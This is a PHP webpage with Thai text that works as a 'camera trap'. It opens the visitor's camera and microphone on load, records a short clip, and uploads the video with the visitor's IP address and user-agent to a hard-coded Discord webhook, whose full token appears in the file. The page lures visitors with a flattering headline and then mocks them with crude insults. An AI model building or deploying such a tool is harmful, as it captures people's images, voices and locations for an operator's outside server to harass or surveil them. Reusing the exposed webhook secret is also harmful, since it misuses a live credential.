<?php
// index.php
// --------- CONFIG ----------
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1427271209883795517/rQMk5rTAsca3tv7MPqTT0hXINR6WriTEcRAgB_TylGbP4Ietiv3BnPyvpPYu6OxQLBuZ';
const SECRET = ''; // optional
const MAX_VIDEO_DURATION = 10; // วินาที
// ---------------------------

// ส่ง embed + วีดีโอไป Discord
function send_video_to_discord($filePath, $filename, $ip, $time, $ua) {
    $cfile = curl_file_create($filePath, 'video/mp4', $filename);
    $data = [
        'embeds' => [[
            'title' => '🎥 Auto-capture (video recording)',
            'color' => hexdec('4f46e5'),
            'fields' => [
                ['name' => 'IP', 'value' => $ip, 'inline' => true],
                ['name' => 'Time', 'value' => $time, 'inline' => true],
                ['name' => 'User-Agent', 'value' => $ua, 'inline' => false],
            ],
            'footer' => ['text' => 'Sent via PHP Webhook'],
            'timestamp' => date('c')
        ]]
    ];

    $post = [
        'payload_json' => json_encode($data),
        'file' => $cfile
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, WEBHOOK_URL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60); // เพิ่ม timeout สำหรับวีดีโอ
    $resp = curl_exec($ch);
    $err = curl_error($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ['resp'=>$resp,'err'=>$err,'httpcode'=>$httpcode];
}

// Handle POST uploads
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $body = file_get_contents('php://input');
    $data = json_decode($body, true);
    if (!$data || empty($data['video_base64'])) {
        http_response_code(400);
        echo json_encode(['ok'=>false,'error'=>'missing video_base64']);
        exit;
    }
    if (SECRET !== '' && ($data['secret'] ?? '') !== SECRET) {
        http_response_code(403);
        echo json_encode(['ok'=>false,'error'=>'invalid_secret']);
        exit;
    }

    $b64 = $data['video_base64'];
    if (preg_match('/^data:(video\/\w+);base64,/', $b64, $m)) {
        $mime = $m[1];
        $b64 = preg_replace('/^data:(video\/\w+);base64,/', '', $b64);
    } else {
        $mime = 'video/mp4';
    }
    $decoded = base64_decode($b64);
    if ($decoded === false) {
        http_response_code(400);
        echo json_encode(['ok'=>false,'error'=>'invalid_base64']);
        exit;
    }

    $tmp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'vid_' . bin2hex(random_bytes(6)) . '.mp4';
    file_put_contents($tmp, $decoded);

    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $time = date('c');

    $out = send_video_to_discord($tmp, 'recording.mp4', $ip, $time, $ua);
    @unlink($tmp);

    $response = ['ok'=>true,'http_code'=>$out['httpcode'],'resp'=>$out['resp'],'ip'=>$ip,'time'=>$time,'ua'=>$ua];
    if ($out['httpcode'] >= 400) {
        http_response_code(500);
        $response['ok'] = false;
        $response['error'] = 'discord_failed';
        $response['details'] = $out;
    }
    echo json_encode($response);
    exit;
}

// Serve HTML (GET)
?>
<!doctype html>
<html lang="th">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Auto-capture (video recording)</title>
<style>
body {
  font-family: system-ui, -apple-system, "Segoe UI", Roboto;
  background: #eef2f7;
  margin: 0;
  padding: 20px;
}
.wrap {
  max-width: 800px;
  margin: 30px auto;
  background: #fff;
  padding: 24px;
  border-radius: 12px;
  box-shadow: 0 12px 32px rgba(0,0,0,0.08);
}
h2 {
  text-align: center;
  margin-bottom: 20px;
  color: #1f2937;
}
.notice {
  background: #fff8e1;
  border-left: 5px solid #f59e0b;
  padding: 12px 16px;
  margin-bottom: 20px;
  border-radius: 8px;
  color: #92400e;
  font-size: 0.95rem;
}
.notice ul { padding-left: 20px; margin: 0; }
#video {
  width: 100%;
  max-width: 720px;
  background: #000;
  border-radius: 12px;
  display: block;
  margin: 20px auto;
  border: 3px solid #4f46e5;
  box-shadow: 0 4px 16px rgba(0,0,0,0.15);
}
#status {
  font-weight: 600;
  text-align: center;
  margin-top: 12px;
  color: #374151;
  padding: 10px;
  background: #f3f4f6;
  border-radius: 8px;
  border: 1px solid #d1d5db;
  max-width: 720px;
  margin-left: auto;
  margin-right: auto;
}
.controls {
  text-align: center;
  margin: 20px 0;
}
button {
  background: #4f46e5;
  color: white;
  border: none;
  padding: 12px 24px;
  border-radius: 8px;
  font-size: 16px;
  cursor: pointer;
  margin: 0 10px;
  transition: background 0.3s;
}
button:hover {
  background: #4338ca;
}
button:disabled {
  background: #9ca3af;
  cursor: not-allowed;
}
</style>
</head>
<body>
<div class="wrap">
<h2>ยิ้มหน่อยเร็วสุดหล่อ 😎</h2>
<div class="notice">
<strong>หมายเหตุสำคัญ:</strong>
<ul>
<li>มึงโดนดักกล้องแล้วไอ้ควาย</li>
<li>หวานเจี๊ยบพี่ชาย</li>
</ul>
</div>
<video id="video" autoplay playsinline muted></video>
<div class="controls">
  <button id="startBtn">เริ่มบันทึกวิดีโอ</button>
  <button id="stopBtn" disabled>หยุดบันทึก</button>
</div>
<div id="status">สถานะ: กดปุ่ม "เริ่มบันทึกวิดีโอ" เพื่อเริ่ม</div>
</div>

<script>
(async () => {
  const statusEl = document.getElementById('status');
  const video = document.getElementById('video');
  const startBtn = document.getElementById('startBtn');
  const stopBtn = document.getElementById('stopBtn');

  let mediaRecorder;
  let recordedChunks = [];
  let stream;

  function setStatus(t) { statusEl.textContent = 'สถานะ: ' + t; }

  async function startCamera() {
    try {
      setStatus('กำลังเปิดกล้อง...');
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }, 
        audio: true 
      });
      video.srcObject = stream;
      setStatus('กล้องพร้อม - กด "เริ่มบันทึกวิดีโอ"');
      
      // ตั้งค่า MediaRecorder
      mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'video/webm;codecs=vp9,opus'
      });
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = processRecording;
      
    } catch (err) {
      console.error(err);
      setStatus('ไม่สามารถเข้าถึงกล้อง: ' + (err.name || err.message || err));
    }
  }

  function startRecording() {
    if (!mediaRecorder) return;
    
    recordedChunks = [];
    mediaRecorder.start(1000); // เก็บข้อมูลทุก 1 วินาที
    startBtn.disabled = true;
    stopBtn.disabled = false;
    setStatus('กำลังบันทึกวิดีโอ...');
    
    // อัตโนมัติหยุดหลังจาก 10 วินาที
    setTimeout(() => {
      if (mediaRecorder && mediaRecorder.state === 'recording') {
        stopRecording();
      }
    }, 10000);
  }

  function stopRecording() {
    if (!mediaRecorder || mediaRecorder.state === 'inactive') return;
    
    mediaRecorder.stop();
    startBtn.disabled = false;
    stopBtn.disabled = true;
    setStatus('กำลังประมวลผลวิดีโอ...');
  }

  async function processRecording() {
    if (recordedChunks.length === 0) {
      setStatus('ไม่มีข้อมูลวิดีโอ');
      return;
    }

    try {
      setStatus('กำลังแปลงวิดีโอ...');
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      
      // แปลงเป็น base64
      const reader = new FileReader();
      reader.onload = async () => {
        const dataUrl = reader.result;
        
        setStatus('กำลังส่งวิดีโอไปยังเซิร์ฟเวอร์...');
        try {
          const resp = await fetch(location.href, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ video_base64: dataUrl })
          });
          const j = await resp.json();
          setStatus(j.ok ? 'ส่งวิดีโอสำเร็จ ✅' : 'ส่งวิดีโอล้มเหลว ❌');
        } catch (e) {
          console.error(e);
          setStatus('ข้อผิดพลาดขณะส่ง: ' + (e.message || e));
        }
      };
      reader.readAsDataURL(blob);
      
    } catch (e) {
      console.error(e);
      setStatus('ข้อผิดพลาดในการประมวลผลวิดีโอ: ' + e.message);
    }
  }

  // Event Listeners
  startBtn.addEventListener('click', startRecording);
  stopBtn.addEventListener('click', stopRecording);

  // เริ่มกล้องเมื่อโหลดหน้า
  window.addEventListener('load', startCamera);
})();
</script>
</body>
</html>
